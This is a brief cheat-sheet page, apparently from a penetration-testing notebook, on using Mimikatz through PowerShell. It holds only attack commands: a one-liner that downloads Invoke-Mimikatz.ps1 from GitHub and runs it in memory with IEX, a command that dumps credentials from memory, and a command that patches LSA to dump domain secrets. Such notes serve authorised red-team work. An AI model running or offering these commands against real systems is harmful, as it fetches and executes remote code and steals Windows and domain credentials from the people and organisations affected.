# Mimikatz

{% code overflow="wrap" %}
```powershell
# Download and load in memory
IEX (New-Object System.Net.Webclient).DownloadString('https://github.com/samratashok/nishang/raw/master/Gather/Invoke-Mimikatz.ps1')

# Dump creds from memory
Invoke-Mimikatz -DumpCreds

# Dump Domain creds
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
```
{% endcode %}
